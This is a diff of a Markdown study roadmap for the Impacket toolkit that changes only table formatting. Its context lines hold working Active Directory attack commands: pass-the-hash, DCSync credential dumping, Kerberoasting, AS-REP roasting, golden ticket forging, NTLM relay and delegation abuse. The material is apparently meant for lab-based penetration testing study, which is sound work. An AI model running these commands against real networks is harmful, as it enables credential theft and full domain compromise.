@@ -21,17 +21,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]] · [[Cyber-Security/Lab/Metasploitable_2/TASK_LIST|🐧 Metasploitable 2 Lab]] · [[Cyber-Security/Lab/OWASP_Broken_WebApps/TASK_LIST|🌐 OWASP BWA Lab]]
 
 | Recon & Scanning | Exploitation | Post-Exploitation | Web & Traffic |
-|:-----------------|:-------------|:-------------------|:--------------|
+| :----------------- | :------------- | :------------------- | :-------------- |
 | [[Nmap\|🗺️ Nmap]] | [[Metasploit_Framework\|💀 Metasploit]] | [[LinPEAS\|🐉 LinPEAS]] | [[Burp_Suite\|🕷️ Burp Suite]] |
 | [[Netcat\|🔌 Netcat]] | **🐍 Impacket** (you are here) | [[BloodHound\|🩸 BloodHound]] | [[Wireshark\|🦈 Wireshark]] |
-| | [[Hydra\|🔓 Hydra]] | [[Hashcat\|🔥 Hashcat]] | |
+|| [[Hydra\|🔓 Hydra]] | [[Hashcat\|🔥 Hashcat]] ||
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals & AD Concepts | 5 | 3–4 hours |
 | 2 | Core Tools (exec, secretsdump) | 8 | 5–8 hours |
 | 3 | Intermediate (Kerberos, Relay) | 6 | 5–7 hours |
@@ -40,7 +40,7 @@
 | 6 | Practical Labs | 4 | 6–10 hours |
 | 7 | Methodology & Limitations | 3 | 2–3 hours |
 | 8 | Mastery Challenges | 3 | 4–6 hours |
-| | **Total** | **38** | **~32–49 hours** |
+|| **Total** | **38** | **~32–49 hours** |
 
 **Prerequisites:** TCP/IP networking. Understanding of Windows authentication (NTLM, Kerberos). Basic Active Directory concepts (domains, domain controllers, users, groups, SPNs). Python basics (Impacket is Python-based).
 
@@ -116,7 +116,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 
 ### Key Options
 | Flag | Meaning |
-|------|---------|
+| ------ | --------- |
 | `-hashes LMHASH:NTLM` | Pass-the-hash auth |
 | `-k` | Kerberos auth (needs valid TGT) |
 | `-no-pass` | No password (AS-REP roasting) |
@@ -136,7 +136,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand that Impacket is a TOOLKIT of individual scripts, each implementing different Windows protocol interactions. It's not one tool — it's 50+ tools sharing a common library. |
 | **Skills Learned** | The Impacket toolkit structure, key tools and their purposes, where Impacket fits in AD attack chains, why protocol-level access from Linux matters for pentesters. |
 | **Practical Exercise** | List Impacket tools: `ls /usr/share/impacket/` or `impacket-` followed by tab-completion. Categorize the top 15 tools by function: remote execution, credential extraction, Kerberos attacks, SMB operations, NTLM relay, enumeration. |
@@ -150,7 +150,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Verify Impacket installation and understand the naming convention. On Kali, tools are prefixed with `impacket-` (e.g., `impacket-psexec`). |
 | **Practical Exercise** | `impacket-psexec --help`, `impacket-secretsdump --help`, `impacket-GetNPUsers --help`. If not installed: `pip3 install impacket` or `apt install python3-impacket`. |
 | **Expected Output** | All key tools accessible and functional. Understanding of the command naming convention. |
@@ -162,7 +162,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand the three authentication methods used across all Impacket tools: password, NTLM hash (pass-the-hash), and Kerberos ticket. Nearly every tool accepts all three. |
 | **Syntax Patterns** | Password: `impacket-psexec domain/user:password@target`. Hash: `impacket-psexec domain/user@target -hashes LM:NTLM`. Kerberos: `impacket-psexec domain/user@target -k -no-pass` (uses ccache ticket). |
 | **Expected Output** | Understanding that pass-the-hash means you DON'T need to crack the password — the hash IS the credential. Understanding of Kerberos ticket-based authentication. |
@@ -175,7 +175,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand the AD concepts needed to use Impacket effectively: Domain Controller, Domain Users/Admins, SPNs (Service Principal Names), Kerberos TGT/TGS, NTLM authentication, SMB signing, LDAP, Group Policy. |
 | **Practical Exercise** | Draw a diagram: User authenticates → Domain Controller issues TGT → User requests TGS for a service → Service validates ticket. Label where Kerberoasting, AS-REP roasting, Pass-the-Ticket, and Golden Ticket attacks occur. |
 | **Expected Output** | Kerberos authentication flow diagram with attack points labeled. Understanding of the AD concepts that Impacket tools exploit. |
@@ -187,7 +187,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Identify Windows/AD targets suitable for Impacket attacks: domain controllers (port 88 Kerberos, 389 LDAP, 445 SMB), member servers (445 SMB, 135 RPC, 5985 WinRM), workstations. |
 | **Practical Exercise** | From Nmap results: identify DCs (`nmap --script smb-os-discovery <target>`), identify domain name, identify open ports for Impacket tools. |
 | **Expected Output** | Target inventory with: hostname, IP, role (DC/member/workstation), open ports relevant to Impacket. |
@@ -203,7 +203,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use `psexec.py` for remote command execution on Windows targets. Understand how it works: uploads a service binary via SMB, creates a Windows service, executes it, returns output. |
 | **Syntax** | `impacket-psexec domain/admin:Password123@<target>`. With hash: `impacket-psexec domain/admin@<target> -hashes :NTLM_HASH`. |
 | **Real-World Scenario** | You have domain admin credentials. Use psexec to get a SYSTEM shell on any domain-joined machine for post-exploitation, credential extraction, or lateral movement. |
@@ -217,7 +217,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use `wmiexec.py` for remote execution via WMI (Windows Management Instrumentation). More stealthy than psexec because it doesn't upload a binary or create a service. |
 | **Syntax** | `impacket-wmiexec domain/admin:Password123@<target>`. Semi-interactive shell — each command is a new WMI process. |
 | **Real-World Scenario** | When psexec is blocked by AV/EDR, wmiexec often works because it uses legitimate WMI infrastructure. |
@@ -231,7 +231,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use `smbexec.py` as another remote execution method. It creates a service that writes output to a file share, then reads it back — no binary upload. |
 | **Syntax** | `impacket-smbexec domain/admin:Password123@<target>`. |
 | **Expected Output** | SYSTEM shell via SMB service creation. Understanding the trade-offs: no binary upload, but creates a service (logged). |
@@ -243,7 +243,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use `secretsdump.py` to remotely extract credentials from a Windows target: SAM database (local accounts), LSA secrets, cached domain credentials, and NTDS.dit (all domain hashes from a Domain Controller — DCSync). |
 | **Syntax** | Local hashes: `impacket-secretsdump domain/admin:Password123@<target>`. DCSync (from DC): `impacket-secretsdump domain/admin:Password123@<DC> -just-dc-ntlm`. Just DC users: `impacket-secretsdump domain/admin:Password123@<DC> -just-dc-user krbtgt`. |
 | **Real-World Scenario** | You've compromised a Domain Admin account. Run secretsdump against the DC to extract every domain user's NTLM hash. This is the "keys to the kingdom" moment. |
@@ -257,7 +257,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use `smbclient.py` to list and access SMB shares. Browse files, upload/download files, and search for sensitive data. |
 | **Syntax** | `impacket-smbclient domain/user:Password123@<target>`. Commands: `shares` (list shares), `use <share>`, `ls`, `get <file>`, `put <file>`, `cd <dir>`. |
 | **Expected Output** | SMB shares enumerated. Sensitive files downloaded (configs, scripts, backups). |
@@ -270,7 +270,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use `GetNPUsers.py` to find AD accounts with "Do not require Kerberos preauthentication" enabled. These accounts' hashes can be requested WITHOUT any credentials (AS-REP Roasting). |
 | **Syntax** | With user list: `impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip <DC> -format hashcat -outputfile asrep-hashes.txt`. Without credentials: `impacket-GetNPUsers domain/ -no-pass -usersfile users.txt -dc-ip <DC>`. With credentials (enumerate automatically): `impacket-GetNPUsers domain/user:password -dc-ip <DC> -request`. |
 | **Real-World Scenario** | You have no credentials but know the domain name. Request AS-REP hashes for accounts with pre-auth disabled → crack offline with Hashcat (`-m 18200`). |
@@ -284,7 +284,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use `GetUserSPNs.py` to perform Kerberoasting: request Kerberos TGS tickets for service accounts, extract the encrypted ticket hash, and crack it offline. Requires valid domain credentials (any user). |
 | **Syntax** | `impacket-GetUserSPNs domain/user:password -dc-ip <DC> -request -outputfile kerberoast-hashes.txt`. |
 | **Real-World Scenario** | You have ANY domain user account. Kerberoast to request service account tickets → crack offline → service accounts often have weak passwords AND high privileges. |
@@ -298,7 +298,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Enumerate domain users, groups, and computers by brute-forcing SID (Security Identifier) values. Works with null sessions or any credentials. |
 | **Syntax** | `impacket-lookupsid domain/user:password@<target> 20000` (enumerate SIDs up to 20000). Null session: `impacket-lookupsid guest@<target> -no-pass`. |
 | **Expected Output** | Complete user and group enumeration via SID brute-force. |
@@ -314,7 +314,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Create Golden Tickets (forged TGT using krbtgt hash — complete domain compromise) and Silver Tickets (forged TGS for specific services). |
 | **Syntax** | Golden Ticket: `impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain <domain> administrator`. Silver Ticket: `impacket-ticketer -nthash <service-hash> -domain-sid <SID> -domain <domain> -spn <SPN> administrator`. Use ticket: `export KRB5CCNAME=administrator.ccache && impacket-psexec domain/administrator@<target> -k -no-pass`. |
 | **Expected Output** | Forged Kerberos tickets used for authentication. Understanding of why Golden Ticket = persistent domain compromise (valid until krbtgt password changes TWICE). |
@@ -327,7 +327,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Relay captured NTLM authentication to a different target. When SMB signing is not required, authentication from one server can be relayed to another for code execution. |
 | **Syntax** | `impacket-ntlmrelayx -t <target> -smb2support -i` (relay to target, get interactive shell). With command: `impacket-ntlmrelayx -t <target> -smb2support -c "whoami"`. Trigger authentication: use Responder, PetitPotam, PrinterBug, or social engineering. |
 | **Expected Output** | Code execution on a target using relayed authentication. Understanding of the NTLM relay attack chain. |
@@ -340,7 +340,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Responder to capture NTLM authentication requests (via LLMNR/NBT-NS poisoning) and relay them to targets using ntlmrelayx. |
 | **Syntax** | Responder (disable SMB/HTTP): `sudo responder -I eth0 -wrf -P -v` (edit Responder.conf: `SMB = Off`, `HTTP = Off`). ntlmrelayx: `impacket-ntlmrelayx -tf targets.txt -smb2support`. |
 | **Expected Output** | Relayed authentication resulting in code execution or credential dumping on target machines. |
@@ -352,7 +352,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Request Kerberos TGTs and Service Tickets programmatically. Used for pass-the-ticket, overpass-the-hash, and constrained delegation attacks. |
 | **Syntax** | Get TGT: `impacket-getTGT domain/user:password -dc-ip <DC>`. Get TGT with hash: `impacket-getTGT domain/user -hashes :NTLM -dc-ip <DC>`. Get Service Ticket: `impacket-getST domain/user:password -spn cifs/<target> -dc-ip <DC>`. Use: `export KRB5CCNAME=user.ccache`. |
 | **Expected Output** | `.ccache` ticket files for Kerberos authentication. Understanding of overpass-the-hash (use NTLM hash to get Kerberos TGT). |
@@ -364,7 +364,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Exploit Resource-Based Constrained Delegation (RBCD) to impersonate administrators on target computers. This is one of the most powerful AD attack techniques. |
 | **Syntax** | Add computer: `impacket-addcomputer domain/user:password -computer-name FAKE$ -computer-pass Passw0rd -dc-ip <DC>`. Configure RBCD: `impacket-rbcd domain/user:password -delegate-to TARGET$ -delegate-from FAKE$ -dc-ip <DC> -action write`. Get ticket: `impacket-getST domain/FAKE$:Passw0rd -spn cifs/TARGET.domain.local -impersonate administrator -dc-ip <DC>`. Use: `export KRB5CCNAME=administrator.ccache && impacket-psexec domain/administrator@TARGET -k -no-pass`. |
 | **Expected Output** | Administrator access on the target through delegation abuse. |
@@ -376,7 +376,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Know alternative remote execution methods: `dcomexec.py` (via DCOM/MMC20), `atexec.py` (via scheduled tasks). Each bypasses different defenses. |
 | **Syntax** | DCOM: `impacket-dcomexec domain/admin:Password@<target>`. Scheduled task: `impacket-atexec domain/admin:Password@<target> "whoami"`. |
 | **Expected Output** | Code execution via alternative protocols when SMB-based methods are blocked. |
@@ -392,7 +392,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Perform a full DCSync attack: extract all domain hashes by simulating domain controller replication. Understand the prerequisites (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions). |
 | **Practical Exercise** | `impacket-secretsdump domain/admin:password@<DC> -just-dc` → extract ALL hashes, Kerberos keys, and cleartext passwords (if stored with reversible encryption). Target specific user: `-just-dc-user domain\krbtgt`. |
 
@@ -403,7 +403,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use extracted NTLM hashes for authentication without cracking them (pass-the-hash). Convert NTLM hash to Kerberos TGT (overpass-the-hash) for environments that require Kerberos. |
 | **Syntax** | PtH: `impacket-psexec domain/admin@<target> -hashes :NTLM_HASH`. OPtH: `impacket-getTGT domain/admin -hashes :NTLM_HASH -dc-ip <DC>` → `export KRB5CCNAME=admin.ccache` → `impacket-psexec domain/admin@<target> -k -no-pass`. |
 
@@ -414,7 +414,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use LDAP enumeration tools to extract comprehensive AD information: users, groups, computers, GPOs, trusts, and organizational units. **Note: `ldapdomaindump` is NOT part of Impacket — it is a separate tool by dirkjanm.** For LDAP enumeration with Impacket, use native LDAP query capabilities or combine with external tools. |
 | **Syntax** | `ldapdomaindump -u 'domain\user' -p 'password' <DC> -o ldap-dump/` (separate tool). Impacket LDAP usage: Impacket provides LDAP protocol support through its libraries, but dedicated enumeration requires `ldapdomaindump` (install separately: `pip3 install ldapdomaindump`) or tools like `impacket-GetADUsers`. |
 
@@ -425,7 +425,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Find and decrypt Group Policy Preferences passwords stored in SYSVOL. The AES key was published by Microsoft — all GPP passwords can be decrypted. |
 | **Syntax** | `impacket-Get-GPPPassword domain/user:password@<DC>`. Or manually: access `\\DC\SYSVOL\domain\Policies\*\Machine\Preferences\Groups\Groups.xml` → decrypt cpassword with `gpp-decrypt`. |
 
@@ -436,7 +436,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 - [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand Active Directory Certificate Services (AD CS) attacks and how they integrate with Impacket workflows. **Note: Certipy is NOT part of Impacket — it is a separate tool for AD CS exploitation.** Impacket can be used with Certipy results (authenticate with obtained certificates, use hashes from certificate authentication with Impacket tools). |
 | **Tools** | `certipy find -u user@domain -p password -dc-ip <DC>` (find vulnerable templates — separate tool). `certipy req` (request cert as admin). `certipy auth -pfx administrator.pfx -dc-ip <DC>` (authenticate → get NTLM hash, then use with Impacket: `impacket-secretsdump -hashes :HASH domain/administrator@DC`). Install Certipy separately: `pip3 install certipy-ad`. |
 
@@ -569,7 +569,7 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can authenticate with password, hash, and Kerberos ticket | ☐ |
 | Can execute commands via psexec, wmiexec, smbexec | ☐ |
 | Can extract credentials with secretsdump (SAM, LSA, NTDS) | ☐ |
